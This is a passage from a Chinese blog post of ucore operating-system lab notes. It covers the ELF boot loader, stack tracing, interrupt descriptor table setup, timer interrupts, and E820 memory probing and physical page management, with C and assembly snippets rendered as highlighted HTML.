class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">bootmain</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// 首先读取ELF的头部</span><br>    readseg((<span class="hljs-keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 通过储存在头部的幻数判断是否是合法的ELF文件</span><br>    <span class="hljs-keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;<br>        <span class="hljs-keyword">goto</span> bad;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proghdr</span> *<span class="hljs-title">ph</span>, *<span class="hljs-title">eph</span>;</span><br><br>    <span class="hljs-comment">// ELF头部有描述ELF文件应加载到内存什么位置的描述表，</span><br>    <span class="hljs-comment">// 先将描述表的头地址存在ph</span><br>    ph = (struct proghdr *)((<span class="hljs-keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);<br>    eph = ph + ELFHDR-&gt;e_phnum;<br><br>    <span class="hljs-comment">// 按照描述表将ELF文件中数据载入内存</span><br>    <span class="hljs-keyword">for</span> (; ph &lt; eph; ph ++) &#123;<br>        readseg(ph-&gt;p_va &amp; <span class="hljs-number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);<br>    &#125;<br>    <span class="hljs-comment">// ELF文件0x1000位置后面的0xd1ec比特被载入内存0x00100000</span><br>    <span class="hljs-comment">// ELF文件0xf000位置后面的0x1d20比特被载入内存0x0010e000</span><br><br>    <span class="hljs-comment">// 根据ELF头部储存的入口信息，找到内核的入口</span><br>    ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="hljs-number">0xFFFFFF</span>))();<br><br>bad:<br>    outw(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8A00</span>);<br>    outw(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8E00</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="练习五"><a href="#练习五" class="headerlink" title="练习五"></a>练习五</h3><blockquote><p>实现函数调用堆栈跟踪函数</p></blockquote><p class="note note-primary"style="font-style:italic;background-color:rgb(240,230,250)">发现并没有在这里提到stabs类型文件, 补充一下</p><ul><li>Stabs refers to a format for information that describes a program to a debugger</li><li>This debugging information describes features of the source file like <u>line numbsers, the types and scopes of variables, and function names, parameters, and scopes.</u> </li><li>generated by compiler into the ‘.s’ file</li><li><a href="https://www.sourceware.org/gdb/onlinedocs/stabs.pdf">documentation</a> </li></ul><p>ss:ebp指向的堆栈位置储存着caller的ebp，以此为线索可以得到所有使用堆栈的函数ebp。<br>ss:ebp+4指向caller调用时的eip，ss:ebp+8等是（可能的）参数。</p><p>输出中，堆栈最深一层为</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ebp:<span class="hljs-number">0x00007bf8</span> eip:<span class="hljs-number">0x00007d68</span> args:<span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00007c4f</span><br>    &lt;unknow&gt;: -- <span class="hljs-number">0x00007d67</span> --<br></code></pre></div></td></tr></table></figure><p>其对应的是第一个使用堆栈的函数，bootmain.c中的bootmain。<br>bootloader设置的堆栈从0x7c00开始，使用”call bootmain”转入bootmain函数。<br>call指令压栈，所以bootmain中ebp为0x7bf8。</p><p><strong>print_stackframe:</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">+|  栈底方向    | 高位地址</span><br><span class="hljs-comment"> |    ...       |</span><br><span class="hljs-comment"> |    ...       |</span><br><span class="hljs-comment"> |  参数3       |</span><br><span class="hljs-comment"> |  参数2       |</span><br><span class="hljs-comment"> |  参数1       |</span><br><span class="hljs-comment"> |  返回地址     |</span><br><span class="hljs-comment"> |  上一层[ebp]  | &lt;-------- [ebp]</span><br><span class="hljs-comment"> |  局部变量     |  低位地址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">uint32_t</span> eip, ebp;<br>eip = read_eip();<br>ebp = read_ebp();<br><span class="hljs-keyword">int</span> i, j;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ebp != <span class="hljs-number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i++)<br>&#123;<br>    cprintf(<span class="hljs-string">&quot;ebp:0x%08x eip:0x%08x args:&quot;</span>, ebp, eip);<br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>    &#123;<br>        cprintf(<span class="hljs-string">&quot;0x%08x &quot;</span>, ((<span class="hljs-keyword">uint32_t</span> *)ebp + <span class="hljs-number">2</span>)[j]);<br>    &#125;<br>    cprintf(<span class="hljs-string">&quot;\n&quot;</span>);<br>    print_debuginfo(eip - <span class="hljs-number">1</span>);<br>    eip = ((<span class="hljs-keyword">uint32_t</span> *)ebp)[<span class="hljs-number">1</span>];<br>    ebp = ((<span class="hljs-keyword">uint32_t</span> *)ebp)[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>需要注意的问题:</p><ul><li><p>gdb命令通过文件加载debuginfo, 包括源代码和函数位置, 一般我们直接使用gdb <em>filepath</em> -q直接进入调试界面, 而本实验先启动qemu(使用.img镜像文件), 然后gdb通过remote连接到qemu中, Makefile中指定的gdbinit文件可以指定一些初始命令.</p><p>这样, gdb没有任何debuginfo, 全靠远程端口给出信息, 所以我们可以在init文件中添加file命令加载符号信息</p></li></ul><h3 id="练习六"><a href="#练习六" class="headerlink" title="练习六"></a>练习六</h3><blockquote><p>完善中断初始化和处理</p></blockquote><ul><li><p>中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p><ul><li><p>一个表项的结构如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Gate descriptors for interrupts and traps */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gatedesc</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> gd_off_15_0 : <span class="hljs-number">16</span>;        <span class="hljs-comment">// low 16 bits of offset in segment</span><br>    <span class="hljs-keyword">unsigned</span> gd_ss : <span class="hljs-number">16</span>;            <span class="hljs-comment">// segment selector</span><br>    <span class="hljs-keyword">unsigned</span> gd_args : <span class="hljs-number">5</span>;            <span class="hljs-comment">// # args, 0 for interrupt/trap gates</span><br>    <span class="hljs-keyword">unsigned</span> gd_rsv1 : <span class="hljs-number">3</span>;            <span class="hljs-comment">// reserved(should be zero I guess)</span><br>    <span class="hljs-keyword">unsigned</span> gd_type : <span class="hljs-number">4</span>;            <span class="hljs-comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span><br>    <span class="hljs-keyword">unsigned</span> gd_s : <span class="hljs-number">1</span>;                <span class="hljs-comment">// must be 0 (system)</span><br>    <span class="hljs-keyword">unsigned</span> gd_dpl : <span class="hljs-number">2</span>;            <span class="hljs-comment">// descriptor(meaning new) privilege level</span><br>    <span class="hljs-keyword">unsigned</span> gd_p : <span class="hljs-number">1</span>;                <span class="hljs-comment">// Present</span><br>    <span class="hljs-keyword">unsigned</span> gd_off_31_16 : <span class="hljs-number">16</span>;        <span class="hljs-comment">// high bits of offset in segment</span><br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>该表项的大小为<code>16+16+5+3+4+1+2+1+16 == 8*8</code>bit，即<strong>8字节</strong>。</p></li><li><p>根据IDT表项的结构，我们可以得知，IDT表项的第二个成员<code>gd_ss</code>为段选择子，第一个成员<code>gd_off_15_0</code>和最后一个成员<code>gd_off_31_16</code>共同组成一个段内偏移地址。根据段选择子和段内偏移地址就可以得出中断处理程序的地址。</p></li></ul></li><li><p>编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init.</p><ul><li><p>具体实现如下，详细信息以注释的形式写入代码中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">idt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-comment">// __vectors定义于vector.S中</span><br>  <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __vectors[];<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(idt) / <span class="hljs-keyword">sizeof</span>(struct gatedesc); i ++)<br>      <span class="hljs-comment">// 目标idt项为idt[i]</span><br>      <span class="hljs-comment">// 该idt项为内核代码，所以使用GD_KTEXT段选择子</span><br>      <span class="hljs-comment">// 中断处理程序的入口地址存放于__vectors[i]</span><br>      <span class="hljs-comment">// 特权级为DPL_KERNEL</span><br>      SETGATE(idt[i], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);<br>  <span class="hljs-comment">// 设置从用户态转为内核态的中断的特权级为DPL_USER</span><br>  <span class="hljs-comment">// 好像就是int 0x80, 不过我没有在任何地方看到说明, 尝试自己写这一段代码花了好多无谓的时间, 诶</span><br>  <span class="hljs-comment">// T_SWITCH_TOK也不知道是什么东西</span><br>  SETGATE(idt[T_SWITCH_TOK], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);<br>  <span class="hljs-comment">// 加载该IDT</span><br>  lidt(&amp;idt_pd);<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>编程完善trap.c中的中断处理函数trap_dispatch**(called by trap(), and trap() called in trapentry.S)**，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p><ul><li><p>这个实现还是比较简单的，注释都说清楚了</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IRQ_OFFSET + IRQ_TIMER:        <span class="hljs-comment">// 全局变量ticks定义于kern/driver/clock.c</span><br>ticks++;       <br><span class="hljs-keyword">if</span>(ticks % TICK_NUM == <span class="hljs-number">0</span>)            <br>        print_ticks();        <br><span class="hljs-keyword">break</span>;    <span class="hljs-comment">// .........</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>结果:</p></li></ul><img src="https://i.loli.net/2021/11/20/n8cShiWkulDqzpP.png" alt="image-20211120131815160" style="zoom:80%;" /><h3 id="拓展练习"><a href="#拓展练习" class="headerlink" title="拓展练习"></a>拓展练习</h3><blockquote><p>Challenge 1: 扩展proj4,增加syscall功能，即增加一用户态函数（可执行一特定系统调用：获得时钟计数值），当内核初始完毕后，可从内核态返回到用户态的函数，而用户态的函数又通过系统调用得到内核态的服务</p></blockquote><p>详见知识点</p><blockquote><p>Challenge 2:用键盘实现用户模式内核模式切换。具体目标是：“键盘输入3时切换到用户模式，键盘输入0时切换到内核模式”。 基本思路是借鉴软中断(syscall功能)的代码，并且把trap.c中软中断处理的设置语句拿过来。</p></blockquote><h1 id="Lab2"><a href="#Lab2" class="headerlink" title="Lab2"></a>Lab2</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-探测系统物理内存布局"><a href="#1-探测系统物理内存布局" class="headerlink" title="1.探测系统物理内存布局"></a>1.探测系统物理内存布局</h3><ul><li>当 ucore 被启动之后，最重要的事情就是知道还有多少内存可用，一般来说，获取内存大小的方法由 BIOS 中断调用和直接探测两种。但BIOS 中断调用方法是一般只能在实模式下完成，而直接探测方法必须在保护模式下完成。通过 BIOS 中断获取内存布局有三种方式，都是基于INT 15h中断，分别为88h e801h e820h。但是 并非在所有情况下这三种方式都能工作。在 Linux kernel 里，采用的方法是依次尝试这三 种方法。而在本实验中，我们通过e820h中断获取内存信息。因为e820h中断必须在实模式下使用，所以我们在 bootloader 进入保护模式之前调用这个 BIOS 中断，并且把 e820 映 射结构<strong>保存在物理地址0x8000</strong>处。</li><li><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab2/lab2_3_5_probe_phymem_methods.html">INT 15h调用</a>完成后, 将返回值存入一个结构体中:</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">e820map</span> &#123;</span><br><span class="hljs-keyword">int</span> nr_map;<span class="hljs-comment">//四字节, map中的元素个数</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> addr;<span class="hljs-comment">// 可用内存的起始地址</span><br>        <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> size;<span class="hljs-comment">// 内存块大小</span><br>        <span class="hljs-keyword">long</span> type;    <span class="hljs-comment">// 四字节, 某块内存的属性。1标识可被使用内存块；2表示保留的内存块，不可映射</span><br>    &#125; <span class="hljs-built_in">map</span>[E820MAX];<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>​    存入的过程为:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">probe_memory:<br>    movl $0, 0x8000   # 初始化，向内存地址0x8000，即uCore结构e820map中的成员nr_map中写入0<br>    xorl %ebx, %ebx   # 初始化%ebx为0，这是int 0x15的其中一个参数<br>    movw $0x8004, %di # 初始化%di寄存器，使其指向结构e820map中的成员数组map<br>start_probe:<br>    movl $0xE820, %eax  # BIOS 0x15中断的子功能编号 %eax == 0xE820<br>    movl $20, %ecx    # 存放地址范围描述符的内存大小，至少20<br>    movl $SMAP, %edx  # 签名， %edx == 0x534D4150h(&quot;SMAP&quot;字符串的ASCII码)<br>    int $0x15     # 调用0x15中断<br>    jnc cont      # 如果该中断执行失败，则CF标志位会置1，此时要通知UCore出错<br>    movw $12345, 0x8000 # 向结构e820map中的成员nr_map中写入特殊信息，报告当前错误<br>    jmp finish_probe    # 跳转至结束，不再探测内存<br>cont:<br>    addw $20, %di   # 如果中断执行正常，则目标写入地址就向后移动一个位置<br>    incl 0x8000     # e820::nr_map++<br>    cmpl $0, %ebx   # 执行中断后，返回的%ebx是原先的%ebx加一。如果%ebx为0，则说明当前内存探测完成<br>    jnz start_probe<br>finish_probe:<br></code></pre></div></td></tr></table></figure><p><code>edata</code>表示<code>kernel</code>的<code>data</code>段结束地址；<code>end</code>表示<code>bss</code>段的结束地址（即整个<code>kernel</code>的结束地址）</p><p><code>edata[]</code>和 <code>end[]</code>这些变量是ld根据kernel.ld链接脚本生成的全局变量，表示相应段的结束地址，它们不在任何一个.S、.c或.h文件中定义，但仍然可以在源码文件中使用。</p><h3 id="2-管理物理-内存"><a href="#2-管理物理-内存" class="headerlink" title="2.管理物理 内存"></a>2.管理<em>物理</em> 内存</h3><ul><li>每一个物理页的属性用结构Page来表示</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> &#123;</span><br>    <span class="hljs-keyword">int</span> ref;        <span class="hljs-comment">// page frame&#x27;s reference counter</span><br>    <span class="hljs-keyword">uint32_t</span> flags; <span class="hljs-comment">// array of flags that describe the status of the page frame</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> property;<span class="hljs-comment">// the num of free *page*, used in first fit pm manager</span><br>    <span class="hljs-keyword">list_entry_t</span> page_link;<span class="hljs-comment">// free list link</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>而flag第一位和第二位(即bit 0 and bit 1, PG_reserved和PG_property的0和1是指第几位):</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Flags describing the status of a page frame */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PG_reserved                 0       <span class="hljs-comment">// the page descriptor is reserved for kernel or unusable</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PG_property                 1       <span class="hljs-comment">// the member &#x27;property&#x27; is valid (free or not)</span></span><br></code></pre></div></td></tr></table></figure><p>​    需要注意的是用到property成员变量的这个Page比较特殊，是这个连续内存空闲块地址<strong>最小的一页</strong>（即头一页， Head Page）,<br>​    用bit PG_property来enable</p><ul><li>使用btl指令置位某一个bit:</li></ul><blockquote><p>BTS %1,  %2     :先把%2对应的内存地址的第%1位的值填入cflags寄存器的进位位C，然后把该位<strong>置位</strong>)</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SetPageReserved(page)       set_bit(PG_reserved, &amp;((page)-&gt;flags)) <span class="hljs-comment">//setbit使用的是内联汇编形式的btl指令</span></span><br></code></pre></div></td></tr></table></figure><ul><li>管理空闲块</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* free_area_t - maintains a doubly linked list to record free (unused) pages */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-keyword">list_entry_t</span> free_list;                                <span class="hljs-comment">// the list header</span><br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> nr_free;                                 <span class="hljs-comment">// num of free pages in this free list</span><br>&#125; <span class="hljs-keyword">free_area_t</span>;<br></code></pre></div></td></tr></table></figure><ul><li>pmm_manager(): 一个函数指针列表, 用于引用管理内存的函数, 指向这个结构体的指针也是<code>pmm_manager</code><br>项目定义了一个<code>default_pmm_manager</code>, 每一个函数指向的具体函数定义在default_pmm_init.c中, 将此结构体地址赋值给<br>(pmm_manager *)pmm_manager, 可以更改为其他内存分配算法</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pmm_manager</span> &#123;</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name; <span class="hljs-comment">//物理内存页管理器的名字</span><br>            <span class="hljs-keyword">void</span> (*init)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//初始化内存管理器</span><br>            <span class="hljs-keyword">void</span> (*init_memmap)(struct Page *base, <span class="hljs-keyword">size_t</span> n); <span class="hljs-comment">//初始化管理空闲内存页的数据结构</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *(*<span class="hljs-title">alloc_pages</span>)(<span class="hljs-title">size_t</span> <span class="hljs-title">n</span>);</span> <span class="hljs-comment">//分配n个物理内存页</span><br>            <span class="hljs-keyword">void</span> (*free_pages)(struct Page *base, <span class="hljs-keyword">size_t</span> n); <span class="hljs-comment">//释放n个物理内存页</span><br>            <span class="hljs-keyword">size_t</span> (*nr_free_pages)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//返回当前剩余的空闲页数</span><br>            <span class="hljs-keyword">void</span> (*check)(<span class="hljs-keyword">void</span>); <span class="hljs-comment">//用于检测分配/释放实现是否正确的辅助函数</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li><code>kern_init()</code>中<code>pmm_init()</code>的==<code>page_init()</code>==部分内容</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// code above is traverse all memmap(e820map) to search the maxpa and print the memmap out</span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> end[];<br><br><span class="hljs-comment">// calc the sum of pages</span><br>npage = maxpa / PGSIZE;<br><span class="hljs-comment">// </span><br>pages = (struct Page *)ROUNDUP((<span class="hljs-keyword">void</span> *)end, PGSIZE);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; npage; i ++) &#123;<br>SetPageReserved(pages + i);<br>&#125;<br><br><span class="hljs-keyword">uintptr_t</span> freemem = PADDR((<span class="hljs-keyword">uintptr_t</span>)pages + <span class="hljs-keyword">sizeof</span>(struct Page) * npage);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*    SetPageReserved只需把物理地址对应的Page结构中的flags标志设置为PG_reserved ，表示这些</span><br><span class="hljs-comment">*页已经被使用了，将来不能被用于分配。</span><br><span class="hljs-comment">*    而init_memmap函数则是把空闲物理页对应的Page结构中的flags和引用计数ref清零，并加到</span><br><span class="hljs-comment">*free_area.free_list指向的双向列表中，为将来的空闲页管理做好初始化准备工作。</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">// code below corrects free physical blocks&#x27; boundaries and initialized </span><br><span class="hljs-comment">// page(not page table), adding page to freelist.</span><br><span class="hljs-comment">// then, all physical pages&#x27; info are stored in base address (struct Page *)pages.</span><br><span class="hljs-comment">// page(s) can be accessed by `struct Page *pages;`, just like array.</span><br></code></pre></div></td></tr></table></figure><h3 id="3-内存空间布局"><a href="#3-内存空间布局" class="headerlink" title="3.内存空间布局"></a>3.内存空间布局</h3><ul><li><p>在uCore中，CPU先在bootasm.S（实模式）中通过调用BIOS中断，将物理内存的相关描述符写入特定位置<code>0x8000</code>，然后读入kernel至物理地址<code>0x10000</code>、虚拟地址<code>0xC0000000</code>。</p></li><li><p>而kernel在<code>page_init</code>函数中，读取物理内存地址<code>0x8000</code>处的内存，查找最大物理地址，并计算出所需的<strong>页面数</strong>。虚拟页表<code>VPT(Virtual Page Table)</code>的地址紧跟<code>kernel</code>，其地址为4k对齐。虚拟地址空间结构如下所示：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * Virtual memory map:                                          Permissions</span><br><span class="hljs-comment"> *                                                              kernel/user</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *     4G -----------&gt; +---------------------------------+</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |         Empty Memory (*)        |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     +---------------------------------+ 0xFB000000</span><br><span class="hljs-comment"> *                     |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span><br><span class="hljs-comment"> *     VPT ----------&gt; +---------------------------------+ 0xFAC00000</span><br><span class="hljs-comment"> *                     |        Invalid Memory (*)       | --/--</span><br><span class="hljs-comment"> *     KERNTOP ------&gt; +---------------------------------+ 0xF8000000</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |    Remapped Physical Memory     | RW/-- KMEMSIZE=896MB</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *     KERNBASE -----&gt; +---------------------------------+ 0xC0000000</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     |                                 |</span><br><span class="hljs-comment"> *                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-comment"> * (*) Note: The kernel ensures that &quot;Invalid Memory&quot; is *never* mapped.</span><br><span class="hljs-comment"> *     &quot;Empty Memory&quot; is normally unmapped, but user programs may map pages</span><br><span class="hljs-comment"> *     there if desired.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br></code></pre></div></td></tr></table></figure><p>完成<strong>物理内存页管理初始化工作</strong>后，其物理地址的分布空间如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 